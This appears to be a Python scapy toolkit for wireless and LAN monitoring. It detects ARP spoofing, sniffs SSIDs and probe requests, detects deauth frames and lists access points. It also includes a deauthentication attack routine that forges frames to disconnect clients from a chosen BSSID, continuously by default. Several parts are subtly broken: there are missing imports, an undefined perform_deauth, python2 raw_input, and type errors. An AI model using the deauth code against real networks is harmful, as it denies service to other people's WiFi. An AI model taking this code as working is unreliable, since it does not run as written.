#!/usr/bin/env python3
#
# MIT - (c) 2016 ThomasTJ (TTJ)
#


import logging
import os
import random
import re
import signal
import sys
import time
from multiprocessing import Process
from time import sleep
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
from scapy.all import sniff, ARP, Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeResp
try:
    import core.core as core
    import core.commands as comm
    from core.colors import bc as bc
except:
    import sys
    sys.path.append('././')
    import core as core
    import commands as comm
    from core.colors import bc as bc


int_mon = "wlp0s29u1u1mon"
# iface="wlp0s29u1u1mon"
global seen_arp
seen_arp = {}
global unique_ssid
unique_ssid = []
global unique_probe
unique_probe = []
global deauth_counter
deauth_counter = 1
aps = {}  # dictionary to store unique APs
global channel_hop
channel_hop = True


def scapy_mon_arp_callback(pkt):
    """CALLBACK: Monitor ARP table on all interfaces."""
    global seen_arp
    if ARP in pkt and pkt[ARP].op in (1, 2):
        mon_data = (pkt[ARP].hwsrc + ' ' + pkt[ARP].psrc)
        arp_data = mon_data.split(' ')
        if (arp_data[0]) not in seen_arp:
            seen_arp[arp_data[0]] = arp_data[1]
            print(bc.OKGREEN + '\tAdding: ' + arp_data[0] + ' - ' + arp_data[1])
        elif (arp_data[0]) in seen_arp:
            for key, value in seen_arp.items():
                if key == arp_data[0] and value != arp_data[1]:
                    print(bc.WARN + '\tWARNING - POSSIBLE ARP-ATTACK!')
                    print(bc.WARN + '\tDuplicated mac address found: ' + key + ' != ' + value)
                    print('')
                    print('\tThe ARP data will be deleted within 10 seconds. If this warning persists, you are under attack!')
                    sleep(10)
                    seen_arp = {}


def scapy_mon_arp():
    """Monitor ARP table on all interfaces."""
    mon_data = sniff(prn=scapy_mon_arp_callback, filter="arp", store=0)
    return mon_data


def sniff_wifi_ssid_mac_callback(pkt):
    """CALLBACK: Scan for WiFi's and return SSID and ESSID."""
    if pkt.haslayer(Dot11):  # 802.11
        try:
            global unique_ssid
            if pkt.info not in unique_ssid and len(pkt.info) > 0:
                unique_ssid.append(pkt.info)
                print(str(pkt.addr2) + " _ " + str(pkt.info.decode('ascii')))
        except AttributeError:
            pass


def sniff_wifi_ssid_mac():
    """Scan for WiFi's and return SSID and ESSID."""
    sniff(count=0, prn=sniff_wifi_ssid_mac_callback, store=0)


def sniff_wifi_ssid_mac_vendor_callback(pkt):
    """CALLBACK: Scan for WiFi's and return SSID and ESSID and Vendor."""
    if pkt.haslayer(Dot11):  # 802.11
        if pkt.type == 0 and pkt.subtype == 4:  # mgmt, probe request
            ssid_mac = str(pkt.info) + "_" + str(pkt.addr2)
            global unique_probe
            if ssid_mac not in unique_probe and len(pkt.info) > 0:
                unique_probe.append(ssid_mac)
                mac = ":".join(pkt.addr2.split(":")[:3]).upper()
                try:
                    macs = open("files/macs.txt").read()  # curl -s "https://code.wireshark.org/review/gitweb?p=wireshark.git;a=blob_plain;f=manuf;hb=HEAD" > manuf.txt
                    vendor = "\n".join(line for line in macs.splitlines() if line.startswith(mac)).split("# ")[1]
                except IndexError:
                    vendor = "unknown"
                print(str("%s (%s %s)" % (pkt.info, pkt.addr2, vendor)))


def sniff_wifi_ssid_mac_vendor():
    """Scan for WiFi's and return SSID and ESSID and Vendor."""
    sniff(count=0, prn=sniff_wifi_ssid_mac_callback, store=0)


def detect_deauth_callback(fm):
    """CALLBACK: Detect deauth attacks by monitoring the deauth frame (fm.subtype==12)."""
    if fm.haslayer(Dot11):
        if ((fm.type == 0) & (fm.subtype == 12)):
            global deauth_counter
            print('Deauth detected! No.: ' + deauth_counter)
            deauth_counter += 1


def detect_deauth(fm):
    """Detect deauth attacks by monitoring the deauth frame (fm.subtype==12)."""
    sniff(prn=detect_deauth_callback)


def attack_deauth_callback(bssid, client, count):
    """Perform a deauth attack against a SSID or/and client."""
    pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    cli_to_ap_pckt = None
    if client != 'FF:FF:FF:FF:FF:FF' :
        cli_to_ap_pckt = Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()
    print('Sending Deauth to ' + client + ' from ' + bssid)
    if not count:
        print('Press CTRL+C to quit')
    # We will do like aireplay does and send the packets in bursts of 64, then sleep for half a sec or so
    while count != 0:
        try:
            for i in range(64):
                # Send out deauth from the AP
                send(pckt)
                # If we're targeting a client, we will also spoof deauth from the client to the AP
                if client != 'FF:FF:FF:FF:FF:FF':
                    send(cli_to_ap_pckt)
            # If count was -1, this will be an infinite loop
            count -= 1
        except KeyboardInterrupt:
            break


def attack_deauth(int_mon):
    target_bssid = raw_input('Enter a BSSID to perform an deauth attack: ')
    target_channel = raw_input('Enter a the BSSID\'s channel: ')
    # while target_bssid not in networks:
    #    if target_bssid == 'q' : sys.exit(0)
    #    raw_input('BSSID not detected... Please enter another (q to quit): ')
    # Get our interface to the correct channel
    print('Changing ' + int_mon + ' to channel ' + target_channel)
    os.system("iwconfig %s channel %d" % (int_mon, target_channel))
    # Now we have a bssid that we have detected, let's get the client MAC
    target_client = raw_input('Enter a client MAC address (Default: FF:FF:FF:FF:FF:FF): ')
    if not target_client:
        target_client = 'FF:FF:FF:FF:FF:FF'
    deauth_pckt_count = raw_input('Number of deauth packets (Default: -1 [constant]): ')
    if not deauth_pckt_count:
        deauth_pckt_count = -1
    perform_deauth(target_bssid, target_client, deauth_pckt_count)


def channel_hopper():
    """Jump between WiFi channels."""
    # Start the channel hopper
    # p = Process(target=channel_hopper)
    # p.start()
    while channel_hop is True:
        try:
            channel = random.randrange(1, 15)
            os.system("iw dev %s set channel %d" % (int_mon, channel))
            time.sleep(1)
        except KeyboardInterrupt:
            break
    # Stop the channel hopper
    # p.terminate()
    # p.join()


# process unique sniffed Beacons and ProbeResponses.
def sniff_aps_callback(p):
    """CALLBACK: Sniff WiFi's - SSID, Mac, Channel, Encryption (Y/N)."""
    # if ((p.haslayer(Dot11Beacon) or p.haslayer(Dot11ProbeResp)) and not aps.has_key(p[Dot11].addr3)):
    if ((p.haslayer(Dot11Beacon) or p.haslayer(Dot11ProbeResp)) and (p[Dot11].addr3) not in aps):
        try:
            ssid = p[Dot11Elt].info.decode('utf-8')
        except:
            ssid = p[Dot11Elt].info
        bssid = p[Dot11].addr3
        channel = int(ord(p[Dot11Elt:3].info))
        capability = p.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}{Dot11ProbeResp:%Dot11ProbeResp.cap%}")

        # Check for encrypted networks
        if re.search("privacy", capability):
            enc = 'Y'
        else:
            enc = 'N'

        # Save discovered AP
        aps[p[Dot11].addr3] = enc

        # Display discovered AP
        print("%02d  %s  %s %s" % (int(channel), enc, bssid, ssid))


# Capture interrupt signal and cleanup before exiting
# def sniff_aps_signal_handler(signal, frame):
def sniff_aps_signal_handler():
    global channel_hop
    channel_hop = False
    # channel_hop.terminate()
    # channel_hop.join()

    print("\n-=-=-=-=-=  STATISTICS =-=-=-=-=-=-")
    print("Total APs found: %d" % len(aps))
    print("Encrypted APs  : %d" % len([ap for ap in aps if aps[ap] == 'Y']))
    print("Unencrypted APs: %d" % len([ap for ap in aps if aps[ap] == 'N']))


def sniff_aps(int_mon):
    # Print the program header
    print("-=-=-=-=-=-= AIROSCAPY =-=-=-=-=-=-")
    print("CH ENC BSSID             SSID")

    # Start the channel hopper
    global channel_hop
    channel_hop = True
    pros = Process(target=channel_hopper)
    pros.start()

    # Capture CTRL-C
    #signal.signal(signal.SIGINT, sniff_aps_signal_handler)

    # Start the sniffer
    sniff(iface=int_mon, prn=sniff_aps_callback)
    sniff_aps_signal_handler()
